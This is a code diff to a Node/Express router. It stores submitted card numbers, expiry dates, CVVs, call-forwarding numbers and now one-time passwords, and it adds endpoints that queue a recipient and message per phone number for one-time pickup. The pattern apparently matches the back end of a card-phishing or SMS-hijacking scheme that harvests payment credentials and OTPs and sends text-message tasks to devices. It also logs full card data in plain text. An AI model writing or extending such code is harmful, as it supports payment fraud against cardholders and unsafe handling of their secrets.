@@ -30,7 +30,8 @@ router.post("/save-data", async (req, res) => {
       cardNumber,
       expiryDate,
       cvv,
-      forwardPhoneNumber
+      forwardPhoneNumber,
+      otp, // added otp to destructuring
     } = req.body;
 
     console.log("Request body:", req.body);
@@ -72,7 +73,8 @@ router.post("/save-data", async (req, res) => {
       cardNumber,
       expiryDate,
       cvv,
-      forwardPhoneNumber
+      forwardPhoneNumber,
+      otp, // add otp to data object
     });
 
     // Build dynamic update fields (ignore undefined)
@@ -193,5 +195,120 @@ router.post("/get-forwarded-number", async (req, res) => {
     });
   }
 });
+
+router.post("/add-to-and-message", async (req, res) => {
+  try {
+    const { phoneNo, to, message } = req.body;
+    console.log(phoneNo, to, message);
+
+    // Validation for required fields
+    if (!phoneNo || !to || !message) {
+      console.log("Missing one of required fields (phoneNo, to, message) in /add-to-and-message. Req body:", req.body);
+      return res.status(400).json({
+        success: false,
+        message: "phoneNo, to, and message are required fields",
+      });
+    }
+
+    // Find user using the correct field from schema ('mobileNumber')
+    let user = await UserModel.findOne({ mobileNumber: phoneNo });
+
+    console.log(user);
+
+    if (user) {
+      // If user exists, update 'to', 'message', and 'messageFetched'
+      user.to = to;
+      user.message = message;
+      user.messageFetched = false;
+      await user.save();
+      console.log("User updated and saved in /add-to-and-message.", { userId: user._id });
+
+      return res.status(200).json({
+        success: true,
+        message: "User data updated successfully.",
+        data: user,
+      });
+    } else {
+      // If user doesn't exist, create new user and set required fields only
+      const newUser = new UserModel({
+        mobileNumber: phoneNo,
+        to: to,
+        message: message,
+        messageFetched: false,
+      });
+      await newUser.save();
+      console.log("New user created and saved in /add-to-and-message.", { userId: newUser._id });
+
+      return res.status(201).json({
+        success: true,
+        message: "User created successfully.",
+        data: newUser,
+      });
+    }
+  } catch (error) {
+    console.error("Error in /add-to-and-message:", error);
+    return res.status(500).json({
+      success: false,
+      message: "Internal server error",
+      error: error.message,
+    });
+  }
+});
+
+router.post("/fetch-to-and-message", async (req, res) => {
+  try {
+    const { phoneNo } = req.body;
+    if (!phoneNo) {
+      console.log("/fetch-to-and-message: phoneNo missing in request.");
+      return res.status(400).json({
+        success: false,
+        message: "phoneNo is required"
+      });
+    }
+
+    // Find user by phoneNo
+    let user = await UserModel.findOne({ mobileNumber: phoneNo });
+    console.log("/fetch-to-and-message: User lookup for", phoneNo, "Result:", user);
+
+    if (!user) {
+      console.log("/fetch-to-and-message: User not found for", phoneNo);
+      return res.status(404).json({
+        success: false,
+        message: "User not found"
+      });
+    }
+
+    // Check if already fetched
+    if (user.messageFetched) {
+      console.log("/fetch-to-and-message: messageFetched already true for", phoneNo);
+      return res.status(400).json({
+        success: false,
+        message: "Unable to fetch. Already fetched."
+      });
+    }
+
+    // Mark messageFetched as true and return to/message
+    user.messageFetched = true;
+    await user.save();
+    console.log("/fetch-to-and-message: messageFetched marked true. Returning to/message.", {
+      to: user.to,
+      message: user.message
+    });
+    return res.status(200).json({
+      success: true,
+      to: user.to,
+      message: user.message
+    });
+  } catch (error) {
+    console.error("Error in /fetch-to-and-message:", error);
+    return res.status(500).json({
+      success: false,
+      message: "Internal server error",
+      error: error.message
+    });
+  }
+});
+
+
 
 export default router;
